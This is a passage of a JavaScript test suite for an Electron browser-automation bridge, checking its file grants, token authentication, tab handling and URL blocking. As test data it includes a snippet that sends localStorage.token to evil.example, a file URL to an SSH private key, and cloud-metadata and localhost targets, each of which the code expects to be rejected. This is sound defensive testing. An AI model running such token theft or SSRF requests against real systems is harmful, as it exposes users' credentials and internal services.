  });
  first.controller.installIpcHandlers();
  const selection = await first.handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});
  assert.equal(selection.ok, true);
  fs.unlinkSync(uploadPath);

  let restoreCalls = 0;
  let releaseCalls = 0;
  const second = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage,
    startAccessingSecurityScopedResource: (bookmark) => {
      assert.equal(bookmark, "bookmark-stale");
      restoreCalls += 1;
      return () => {
        releaseCalls += 1;
      };
    },
  });
  const restored = await second.controller.performAction({
    action: "restore_security_scope",
    security_scope_ref: selection.security_scope_ref,
  });
  const upload = await second.controller.performAction({
    action: "upload_file",
    path: uploadPath,
    file_grant_id: "grant-stale",
    metadata: {
      file_grant_id: "grant-stale",
      security_scope_ref: selection.security_scope_ref,
    },
  });

  assert.equal(restored.ok, false);
  assert.equal(restored.error_code, "mas_security_scope_bookmark_stale");
  assert.equal(restored.bookmark_stale, true);
  assert.equal(restoreCalls, 1);
  assert.equal(releaseCalls, 1);
  assert.equal(upload.ok, false);
  assert.equal(upload.error_code, "mas_security_scope_bookmark_stale");
  assert.equal(upload.bookmark_stale, true);
});

test("MAS bookmark restore marks an undecryptable record stale", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-decrypt-stale-"),
  );
  const uploadPath = path.join(userDataDir, "decrypt-stale-upload.txt");
  fs.writeFileSync(uploadPath, "upload");
  const first = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage: makeSafeStorage(),
    dialog: {
      showOpenDialog: async () => ({
        canceled: false,
        filePaths: [uploadPath],
        bookmarks: ["bookmark-decrypt-stale"],
      }),
    },
    startAccessingSecurityScopedResource: () => () => {},
  });
  first.controller.installIpcHandlers();
  const selection = await first.handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});
  assert.equal(selection.ok, true);

  let startCalls = 0;
  const second = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage: {
      ...makeSafeStorage(),
      decryptString: () => {
        throw new Error("ciphertext rejected");
      },
    },
    startAccessingSecurityScopedResource: () => {
      startCalls += 1;
      return () => {};
    },
  });
  const restored = await second.controller.performAction({
    action: "restore_security_scope",
    security_scope_ref: selection.security_scope_ref,
  });
  const retried = await second.controller.performAction({
    action: "restore_security_scope",
    security_scope_ref: selection.security_scope_ref,
  });
  const store = JSON.parse(
    fs.readFileSync(
      path.join(
        userDataDir,
        "browser-workbench",
        "security-scoped-bookmarks.json",
      ),
      "utf8",
    ),
  );
  const record = store.records[selection.security_scope_ref];

  assert.equal(restored.ok, false);
  assert.equal(restored.error_code, "mas_security_scope_bookmark_stale");
  assert.equal(restored.bookmark_stale, true);
  assert.equal(retried.error_code, "mas_security_scope_bookmark_stale");
  assert.equal(startCalls, 0);
  assert.equal(record.status, "stale");
  assert.equal(record.stale_reason, "decrypt_failed");
});

test("stopping the browser bridge releases every active MAS security scope", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-stop-scopes-"),
  );
  const firstPath = path.join(userDataDir, "first.txt");
  const secondPath = path.join(userDataDir, "second.txt");
  fs.writeFileSync(firstPath, "first");
  fs.writeFileSync(secondPath, "second");
  const selections = [
    { filePaths: [firstPath], bookmarks: ["bookmark-first"] },
    { filePaths: [secondPath], bookmarks: ["bookmark-second"] },
  ];
  const released = [];
  const { controller, handlers } = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage: makeSafeStorage(),
    dialog: {
      showOpenDialog: async () => ({ canceled: false, ...selections.shift() }),
    },
    startAccessingSecurityScopedResource: (bookmark) => () =>
      released.push(bookmark),
  });
  controller.installIpcHandlers();
  const first = await handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});
  const second = await handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});

  controller.stopBridgeServer();
  const releaseAgain = await controller.performAction({
    action: "release_security_scope",
    security_scope_ref: first.security_scope_ref,
  });

  assert.deepEqual(released.sort(), ["bookmark-first", "bookmark-second"]);
  assert.equal(releaseAgain.released, false);
  assert.equal(releaseAgain.ok, false);
  assert.notEqual(first.security_scope_ref, second.security_scope_ref);
});

test("MAS bridge blocks background-observable actions before creating hidden tabs", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const { controller } = makeController({ distributionChannel: "mas" });

  const result = await controller.performAction({
    action: "open",
    url: "https://example.com/task",
    metadata: {
      background_observable: true,
      task_group_id: "task-background-1",
    },
  });

  assert.equal(result.ok, false);
  assert.equal(result.error_code, "mas_background_execution_limited");
  assert.equal(result.capability_matrix_id, "background_scheduled_execution");
  assert.equal(result.capability_matrix_mode, "interactive_only");
  assert.equal(FakeBrowserWindow.instances.length, 0);
  assert.equal(FakeBrowserView.instances.length, 0);
});

test("workbench IPC rejects untrusted senders before browser actions", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const { controller, handlers } = makeController({
    isTrustedIpcEvent: () => false,
  });
  controller.installIpcHandlers();

  const result = await handlers.get("lantai:browser-workbench-action")(
    { sender: { id: 99 } },
    { action: "navigate", url: "https://example.com" },
  );

  assert.deepEqual(result, { ok: false, error: "untrusted_ipc_sender" });
  assert.equal(FakeBrowserWindow.instances.length, 0);
  assert.equal(FakeBrowserView.instances.length, 0);
});

test("evidence captures use collision-resistant file names", async () => {
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-browser-evidence-"),
  );
  const { controller } = makeController({ userDataDir });
  const open = await controller.performAction({
    action: "open_workbench",
    profile_id: "default",
    url: "https://example.com",
  });
  const tabId = open.active_tab_id;

  const firstShot = await controller.performAction({
    action: "screenshot",
    tab_id: tabId,
  });
  const secondShot = await controller.performAction({
    action: "screenshot",
    tab_id: tabId,
  });
  const firstPdf = await controller.performAction({
    action: "pdf",
    tab_id: tabId,
  });
  const secondPdf = await controller.performAction({
    action: "pdf",
    tab_id: tabId,
  });

  assert.notEqual(firstShot.path, secondShot.path);
  assert.notEqual(firstPdf.path, secondPdf.path);
  assert.ok(firstShot.path.startsWith(userDataDir));
  assert.ok(firstPdf.path.startsWith(userDataDir));
  assert.ok(fs.existsSync(firstShot.path));
  assert.ok(fs.existsSync(secondShot.path));
  assert.ok(fs.existsSync(firstPdf.path));
  assert.ok(fs.existsSync(secondPdf.path));
});

test("clearing profile storage closes matching tabs and clears partition", async () => {
  const fakeSession = new FakeSession();
  const { controller } = makeController({ session: fakeSession });

  await controller.performAction({
    action: "open_workbench",
    profile_id: "GitHub Work",
    url: "https://github.com",
  });
  await controller.performAction({
    action: "new_tab",
    profile_id: "Research",
    url: "https://example.com",
  });
  const cleared = await controller.performAction({
    action: "clear_profile_storage",
    profile_id: "GitHub Work",
  });
  const state = await controller.performAction({ action: "state" });

  assert.equal(cleared.ok, true);
  assert.equal(cleared.profile_id, "github-work");
  assert.equal(cleared.partition, "persist:lantai-browser-github-work");
  assert.equal(cleared.closed_tabs, 1);
  assert.deepEqual(fakeSession.partitions, [
    "persist:lantai-browser-github-work",
  ]);
  assert.ok(
    fakeSession.cleared.some((item) => item.method === "clearStorageData"),
  );
  assert.ok(state.tabs.every((tab) => tab.profile_id !== "github-work"));
});

test("background task tabs do not steal the active workbench tab", async () => {
  const { controller } = makeController();

  const opened = await controller.performAction({
    action: "open_workbench",
    profile_id: "Manual Work",
    url: "https://manual.example/start",
  });
  const manualTabId = opened.active_tab_id;
  const manualAttachedView = FakeBrowserWindow.instances.at(-1).views[0];

  const backgroundOpen = await controller.performAction({
    action: "open",
    profile_id: "Research",
    url: "https://example.com/task",
    metadata: {
      background_observable: true,
      task_group_id: "task-background-1",
    },
  });
  const backgroundTab = backgroundOpen.tabs.find(
    (tab) => tab.task_group_id === "task-background-1",
  );

  assert.ok(backgroundTab);
  assert.equal(backgroundTab.background, true);
  assert.equal(backgroundTab.profile_id, "research");
  assert.equal(backgroundOpen.active_tab_id, manualTabId);
  assert.equal(FakeBrowserWindow.instances.at(-1).views[0], manualAttachedView);

  const snapshot = await controller.performAction({
    action: "snapshot",
    profile_id: "Research",
    metadata: {
      background_observable: true,
      task_group_id: "task-background-1",
    },
  });
  const clickAt = await controller.performAction({
    action: "click_at",
    page_id: backgroundTab.id,
    x: 12,
    y: 24,
    metadata: {
      background_observable: true,
      task_group_id: "task-background-1",
    },
  });
  const finalState = await controller.performAction({ action: "state" });

  assert.equal(snapshot.page_id, backgroundTab.id);
  assert.equal(clickAt.page_id, backgroundTab.id);
  assert.equal(finalState.active_tab_id, manualTabId);
  assert.equal(FakeBrowserWindow.instances.at(-1).views[0], manualAttachedView);
});

test("terminal task cleanup closes only the matching task group", async () => {
  const { controller } = makeController();

  const manual = await controller.performAction({
    action: "open_workbench",
    profile_id: "Research",
    url: "https://manual.example/start",
  });
  const manualTabId = manual.active_tab_id;
  await controller.performAction({
    action: "open",
    profile_id: "Research",
    url: "https://example.com/task-one",
    metadata: {
      background_observable: true,
      task_group_id: "task-one",
    },
  });
  await controller.performAction({
    action: "open",
    profile_id: "Research",
    url: "https://example.com/task-two",
    metadata: {
      background_observable: true,
      task_group_id: "task-two",
    },
  });

  const cleaned = await controller.performAction({
    action: "close_task_group",
    profile_id: "Research",
    metadata: { task_group_id: "task-one" },
  });

  assert.equal(cleaned.ok, true);
  assert.equal(cleaned.closed_tabs, 1);
  assert.equal(cleaned.task_group_id, "task-one");
  assert.equal(cleaned.active_tab_id, manualTabId);
  assert.ok(cleaned.tabs.some((tab) => tab.id === manualTabId));
  assert.ok(cleaned.tabs.some((tab) => tab.task_group_id === "task-two"));
  assert.ok(cleaned.tabs.every((tab) => tab.task_group_id !== "task-one"));
});

test("download events are owned by the triggering tab", async () => {
  const downloadSession = new EventEmitter();
  const { controller } = makeController({ downloadSession });

  const active = await controller.performAction({
    action: "open_workbench",
    profile_id: "default",
    url: "https://example.com/active",
  });
  const activeTabId = active.active_tab_id;

  const background = await controller.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://example.com/download",
    background_observable: true,
    task_group_id: "download-task",
  });
  const backgroundTabId = background.page_id;
  const backgroundWebContents = FakeBrowserView.instances.at(-1).webContents;
  const item = new EventEmitter();
  item.getURL = () => "https://example.com/report.csv";
  item.getFilename = () => "report.csv";
  item.getSavePath = () => path.join(os.tmpdir(), "report.csv");

  downloadSession.emit("will-download", {}, item, backgroundWebContents);
  item.emit("done", {}, "completed");

  const activeWait = await controller.performAction({
    action: "download_wait",
    tab_id: activeTabId,
    filename: "report.csv",
    timeout_ms: 1,
  });
  const backgroundWait = await controller.performAction({
    action: "download_wait",
    tab_id: backgroundTabId,
    filename: "report.csv",
    timeout_ms: 1,
  });

  assert.equal(activeWait.ok, false);
  assert.equal(backgroundWait.ok, true);
  assert.equal(backgroundWait.data.done.tab_id, backgroundTabId);
});

test("page popups are routed into workbench tabs and deduplicated", async () => {
  const { controller } = makeController();

  const result = await controller.performAction({
    action: "open_workbench",
    profile_id: "WeChat Work",
    url: "https://mp.weixin.qq.com/",
  });
  const firstView = FakeBrowserView.instances.at(-1);

  const denied = firstView.webContents.windowOpenHandler({
    url: "https://mp.weixin.qq.com/cgi-bin/appmsg?t=media/appmsg_edit",
  });
  const stateAfterOpen = await controller.performAction({ action: "state" });
  const deniedAgain = firstView.webContents.windowOpenHandler({
    url: "https://mp.weixin.qq.com/cgi-bin/appmsg?t=media/appmsg_edit",
  });
  const stateAfterDuplicate = await controller.performAction({
    action: "state",
  });

  assert.equal(result.tabs.length, 1);
  assert.deepEqual(denied, { action: "deny" });
  assert.deepEqual(deniedAgain, { action: "deny" });
  assert.equal(stateAfterOpen.tabs.length, 2);
  assert.equal(stateAfterOpen.tabs[1].profile_id, "wechat-work");
  assert.equal(
    stateAfterOpen.tabs[1].url,
    "https://mp.weixin.qq.com/cgi-bin/appmsg?t=media/appmsg_edit",
  );
  assert.equal(stateAfterDuplicate.tabs.length, 2);
});

test("agent takeover controls update bridge state", async () => {
  const { controller } = makeController();

  const paused = await controller.performAction({ action: "agent_pause" });
  const resumed = await controller.performAction({ action: "agent_resume" });
  const stopped = await controller.performAction({ action: "agent_stop" });

  assert.equal(paused.agent_status, "已暂停");
  assert.equal(paused.current_action, "等待用户继续");
  assert.equal(resumed.agent_status, "Agent 接管");
  assert.equal(stopped.agent_status, "已终止");
  assert.equal(stopped.current_action, "用户已终止浏览器任务");
});

test("bridge controller restart rotates the action capability root token", () => {
  const tokens = ["bridge-token-before-restart", "bridge-token-after-restart"];
  const nextToken = () => tokens.shift();

  const first = makeController({ randomToken: nextToken });
  const second = makeController({ randomToken: nextToken });

  assert.equal(
    first.controller.getBridgeToken(),
    "bridge-token-before-restart",
  );
  assert.equal(
    second.controller.getBridgeToken(),
    "bridge-token-after-restart",
  );
  assert.notEqual(
    first.controller.getBridgeToken(),
    second.controller.getBridgeToken(),
  );
});

test("bridge server rejects missing token and accepts action calls", async (t) => {
  const { controller } = makeController();
  let baseUrl;
  try {
    baseUrl = await controller.startBridgeServer();
  } catch (error) {
    if (error?.code === "EPERM") {
      t.skip("Local HTTP listen is not permitted in this sandbox.");
      return;
    }
    throw error;
  }

  try {
    const unauthorized = await fetch(`${baseUrl}/state`);
    const unauthorizedPayload = await unauthorized.json();
    assert.equal(unauthorized.status, 401);
    assert.equal(
      unauthorizedPayload.error_code,
      "electron_bridge_unauthorized",
    );

    const wrongToken = await fetch(`${baseUrl}/state`, {
      headers: { "X-Lantai-Browser-Bridge-Token": "wrong-token" },
    });
    const wrongTokenPayload = await wrongToken.json();
    assert.equal(wrongToken.status, 401);
    assert.equal(wrongTokenPayload.error_code, "electron_bridge_unauthorized");

    const actionPayload = {
      action: "new_tab",
      profile_id: "default",
      url: "about:blank",
    };
    const actionBody = JSON.stringify(actionPayload);

    const rootTokenAction = await fetch(`${baseUrl}/action`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Lantai-Browser-Bridge-Token": "test-token",
      },
      body: actionBody,
    });
    const rootTokenActionPayload = await rootTokenAction.json();
    assert.equal(rootTokenAction.status, 401);
    assert.equal(
      rootTokenActionPayload.error_code,
      "electron_bridge_unauthorized",
    );

    const capability = signBridgeActionCapability("test-token", actionBody, {
      nonce: "action-nonce-1",
    });
    const response = await fetch(`${baseUrl}/action`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Lantai-Browser-Bridge-Capability": capability,
      },
      body: actionBody,
    });
    const payload = await response.json();

    assert.equal(response.status, 200);
    assert.equal(payload.ok, true);
    assert.equal(payload.tabs.length, 1);

    const replay = await fetch(`${baseUrl}/action`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Lantai-Browser-Bridge-Capability": capability,
      },
      body: actionBody,
    });
    const replayPayload = await replay.json();
    assert.equal(replay.status, 401);
    assert.equal(replayPayload.error_code, "electron_bridge_unauthorized");

    const modifiedBody = JSON.stringify({
      ...actionPayload,
      url: "https://example.com",
    });
    const bodyBoundCapability = signBridgeActionCapability(
      "test-token",
      actionBody,
      {
        nonce: "action-nonce-2",
      },
    );
    const modified = await fetch(`${baseUrl}/action`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Lantai-Browser-Bridge-Capability": bodyBoundCapability,
      },
      body: modifiedBody,
    });
    const modifiedPayload = await modified.json();
    assert.equal(modified.status, 401);
    assert.equal(modifiedPayload.error_code, "electron_bridge_unauthorized");
  } finally {
    controller.stopBridgeServer();
  }
});

test("bridge restart rotates action capability root and rejects old write capabilities", async (t) => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const actionPayload = {
    action: "new_tab",
    profile_id: "default",
    url: "about:blank",
  };
  const actionBody = JSON.stringify(actionPayload);
  const oldCapability = signBridgeActionCapability(
    "bridge-token-before-restart",
    actionBody,
    {
      nonce: "restart-action-nonce",
    },
  );
  const first = makeController({
    randomToken: () => "bridge-token-before-restart",
  });
  let firstBaseUrl;
  try {
    firstBaseUrl = await first.controller.startBridgeServer();
  } catch (error) {
    if (error?.code === "EPERM") {
      t.skip("Local HTTP listen is not permitted in this sandbox.");
      return;
    }
    throw error;
  }

  try {
    const accepted = await fetch(`${firstBaseUrl}/action`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Lantai-Browser-Bridge-Capability": oldCapability,
      },
      body: actionBody,
    });
    const acceptedPayload = await accepted.json();
    assert.equal(accepted.status, 200);
    assert.equal(acceptedPayload.ok, true);
    assert.equal(acceptedPayload.tabs.length, 1);
  } finally {
    first.controller.stopBridgeServer();
  }

  const second = makeController({
    randomToken: () => "bridge-token-after-restart",
  });
  const secondBaseUrl = await second.controller.startBridgeServer();
  try {
    const replayedAfterRestart = await fetch(`${secondBaseUrl}/action`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Lantai-Browser-Bridge-Capability": oldCapability,
      },
      body: actionBody,
    });
    const replayedPayload = await replayedAfterRestart.json();
    assert.equal(replayedAfterRestart.status, 401);
    assert.equal(replayedPayload.error_code, "electron_bridge_unauthorized");

    const freshCapability = signBridgeActionCapability(
      "bridge-token-after-restart",
      actionBody,
      {
        nonce: "restart-action-nonce-after",
      },
    );
    const fresh = await fetch(`${secondBaseUrl}/action`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Lantai-Browser-Bridge-Capability": freshCapability,
      },
      body: actionBody,
    });
    const freshPayload = await fresh.json();
    assert.equal(fresh.status, 200);
    assert.equal(freshPayload.ok, true);
    assert.equal(freshPayload.tabs.length, 1);
  } finally {
    second.controller.stopBridgeServer();
  }
});

test("workbench rejects local file URL navigation", async () => {
  const { controller } = makeController();
  const fileUrl = "file:///Users/example/.ssh/id_rsa";

  const blockedNewTab = await controller.performAction({
    action: "new_tab",
    profile_id: "default",
    url: fileUrl,
  });

  assert.equal(blockedNewTab.ok, false);
  assert.equal(blockedNewTab.error_code, "browser_url_scheme_blocked");

  const tab = await controller.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "about:blank",
  });
  const blockedNavigate = await controller.performAction({
    action: "navigate",
    tab_id: tab.page_id,
    url: fileUrl,
  });

  assert.equal(blockedNavigate.ok, false);
  assert.equal(blockedNavigate.error_code, "browser_url_scheme_blocked");
  assert.equal(
    FakeBrowserView.instances.at(-1).webContents.getURL(),
    "about:blank",
  );
});

test("workbench rejects private-network and non-http navigation", async () => {
  const { controller } = makeController();

  const localhost = await controller.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "http://127.0.0.1:3000/admin",
  });
  const dataUrl = await controller.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "data:text/html,secret",
  });

  assert.equal(localhost.ok, false);
  assert.equal(localhost.error_code, "browser_private_network_url_blocked");
  assert.equal(dataUrl.ok, false);
  assert.equal(dataUrl.error_code, "browser_url_scheme_blocked");
});

test("workbench rejects dns and final-url private network navigation", async () => {
  const lookupHost = async (hostname) => {
    if (hostname === "internal.example") {
      return [{ address: "10.0.0.8", family: 4 }];
    }
    return [{ address: "93.184.216.34", family: 4 }];
  };
  const { controller } = makeController({
    lookupHost,
    finalUrlForLoad: {
      "https://public.example/start": "http://169.254.169.254/latest/meta-data",
    },
  });

  const blockedDns = await controller.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://internal.example/admin",
  });
  const blockedFinalUrl = await controller.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://public.example/start",
  });

  assert.equal(blockedDns.ok, false);
  assert.equal(blockedDns.error_code, "browser_private_network_url_blocked");
  assert.equal(blockedFinalUrl.ok, false);
  assert.equal(
    blockedFinalUrl.error_code,
    "browser_private_network_url_blocked",
  );
  assert.equal(
    blockedFinalUrl.final_url,
    "http://169.254.169.254/latest/meta-data",
  );
  assert.equal(
    FakeBrowserView.instances.at(-1).webContents.getURL(),
    "about:blank",
  );
});

test("workbench allows proxy-routed synthetic DNS while keeping direct and private targets blocked", async () => {
  const fakeIpLookup = async () => [
    { address: "198.18.0.167", family: 4 },
    { address: "::ffff:198.18.0.167", family: 6 },
  ];
  const { controller: proxiedController } = makeController({
    lookupHost: fakeIpLookup,
    resolveProxyForUrl: async () => "PROXY 127.0.0.1:1082",
  });

  const proxiedPublicHost = await proxiedController.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://mp.weixin.qq.com/s/example",
  });

  assert.equal(proxiedPublicHost.ok, true);
  assert.equal(proxiedPublicHost.url, "https://mp.weixin.qq.com/s/example");

  const proxiedLiteralFakeIp = await proxiedController.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://198.18.0.167/",
  });
  assert.equal(proxiedLiteralFakeIp.ok, false);
  assert.equal(
    proxiedLiteralFakeIp.error_code,
    "browser_private_network_url_blocked",
  );

  const proxiedMappedLiteralFakeIp = await proxiedController.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://[::ffff:198.18.0.167]/",
  });
  assert.equal(proxiedMappedLiteralFakeIp.ok, false);
  assert.equal(
    proxiedMappedLiteralFakeIp.error_code,
    "browser_private_network_url_blocked",
  );

  const { controller: directController } = makeController({
    lookupHost: fakeIpLookup,
    resolveProxyForUrl: async () => "DIRECT",
  });
  const directPublicHost = await directController.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://mp.weixin.qq.com/s/example",
  });
  assert.equal(directPublicHost.ok, false);
  assert.equal(
    directPublicHost.error_code,
    "browser_private_network_url_blocked",
  );

  const { controller: privateController } = makeController({
    lookupHost: async () => [{ address: "::ffff:10.0.0.8", family: 6 }],
    resolveProxyForUrl: async () => "PROXY 127.0.0.1:1082",
  });
  const proxiedPrivateHost = await privateController.performAction({
    action: "new_tab",
    profile_id: "default",
    url: "https://internal.example/admin",
  });
  assert.equal(proxiedPrivateHost.ok, false);
  assert.equal(
    proxiedPrivateHost.error_code,
    "browser_private_network_url_blocked",
  );
});

test("advanced bridge actions execute common browser gestures", async () => {
  const { controller } = makeController();
  const open = await controller.performAction({
    action: "open_workbench",
    profile_id: "default",
    url: "about:blank",
  });
  const tabId = open.active_tab_id;

  const hovered = await controller.performAction({
    action: "hover",
    tab_id: tabId,
    selector: "#menu",
  });
  const filled = await controller.performAction({
    action: "fill_form",
    tab_id: tabId,
    fields: { "#title": "Hello", "[contenteditable=true]": "正文\n第二段" },
  });
  const dragged = await controller.performAction({
    action: "drag",
    tab_id: tabId,
    start_x: 10,
    start_y: 10,
    end_x: 80,
    end_y: 90,
  });
  const performanceTrace = await controller.performAction({
    action: "performance_trace",
    tab_id: tabId,
  });
  const evaluated = await controller.performAction({
    action: "evaluate",
    tab_id: tabId,
    metadata: { safe_script_id: "browser.page_summary" },
  });
  const blockedEvaluate = await controller.performAction({
    action: "evaluate",
    tab_id: tabId,
    code: "() => fetch('https://evil.example/steal?token=' + localStorage.token)",
  });
  const table = await controller.performAction({
    action: "extract_table",
    tab_id: tabId,
  });
  const list = await controller.performAction({
    action: "extract_list",
    tab_id: tabId,
  });
  const started = await controller.performAction({
    action: "screencast_start",
    tab_id: tabId,
  });
  const stopped = await controller.performAction({
    action: "screencast_stop",
    tab_id: tabId,
  });
  const uploadFile = path.join(os.tmpdir(), "lantai-browser-upload.txt");
  fs.writeFileSync(uploadFile, "upload");
  const uploaded = await controller.performAction({
    action: "upload_file",
    tab_id: tabId,
    selector: "input[type=file]",
    file_path: uploadFile,
  });
  const network = await controller.performAction({
    action: "network_get",
    tab_id: tabId,
    request_id: "request-1",
  });

  assert.equal(hovered.ok, true);
  assert.equal(filled.ok, true);
  assert.equal(filled.data.details[1].mode, "contenteditable_insert_text");
  assert.match(
    FakeBrowserView.instances.at(-1).webContents.scripts.join("\n"),
    /document\.execCommand\("insertText"/,
  );
  assert.equal(dragged.ok, true);
  assert.equal(performanceTrace.ok, true);
  assert.deepEqual(evaluated.data.value, ["row"]);
  assert.equal(table.data.count, 1);
  assert.equal(table.data.tables[0].row_count, 1);
  assert.equal(list.data.count, 1);
  assert.equal(list.data.items[0].text, "Item");
  assert.equal(started.ok, true);
  assert.equal(started.data.screencast, "started");
  assert.equal(stopped.ok, true);
  assert.equal(stopped.data.screencast, "stopped");
  assert.equal(blockedEvaluate.ok, false);
  assert.equal(
    blockedEvaluate.error_code,
    "browser_evaluate_script_registry_required",
  );
  assert.equal(uploaded.ok, false);
  assert.equal(uploaded.error_code, "browser_file_grant_required");
  assert.equal(network.ok, true);
  assert.equal(network.data.body.body_preview, "body");
  assert.equal(network.data.body.redacted, true);
  assert.equal(Object.hasOwn(network.data.body, "body"), false);
});

test("bridge selector actions can target frames and open shadow roots", async () => {
  const { controller } = makeController();
  const open = await controller.performAction({
    action: "open_workbench",
    profile_id: "default",
    url: "about:blank",
  });
  const tabId = open.active_tab_id;
  const metadata = {
    frame_selector: "iframe.editor",
    shadow_host_selector: "editor-shell",
  };

  const clicked = await controller.performAction({
    action: "click",
    tab_id: tabId,
    selector: "button.save",
    metadata,
  });
  const typed = await controller.performAction({
    action: "type",
    tab_id: tabId,
    selector: "input.title",
    text: "Hello",
    metadata,
  });
  const selected = await controller.performAction({
    action: "select",
    tab_id: tabId,
    selector: "select.category",
    text: "news",
    metadata,
  });
  const filled = await controller.performAction({
    action: "fill_form",
    tab_id: tabId,
    fields: { "#title": "Hello" },
    metadata,
  });
  const scripts = FakeBrowserView.instances
    .at(-1)
    .webContents.scripts.join("\n");

  assert.equal(clicked.ok, true);
  assert.equal(clicked.data.scope.frame_selector, "iframe.editor");
  assert.equal(typed.ok, true);
  assert.equal(typed.data.scope.shadow_host_selector, "editor-shell");
  assert.equal(selected.ok, true);
  assert.equal(selected.data.scope.frame_selector, "iframe.editor");
  assert.equal(filled.ok, true);
  assert.equal(
    filled.data.details[0].scope.shadow_host_selector,
    "editor-shell",
  );
  assert.match(scripts, /resolveRoot/);
  assert.match(scripts, /queryAllScoped/);
});

test("snapshot DOM contract is executable, scoped, and never exports input values", async () => {
  const { controller } = makeController();
  const opened = await controller.performAction({
    action: "open_workbench",
    profile_id: "default",
    url: "https://example.com/form",
  });

  await controller.performAction({
    action: "snapshot",
    tab_id: opened.active_tab_id,
  });
  const script = FakeBrowserView.instances.at(-1).webContents.scripts.at(-1);

  assert.doesNotThrow(() => new Function(script));
  assert.match(script, /elementSelector/);
  assert.match(script, /value_length/);
  assert.match(script, /sensitive/);
  assert.match(script, /frame_selector/);
  assert.match(script, /shadow_host_selector/);
  assert.doesNotMatch(script, /value:\s*el\.value/);
});
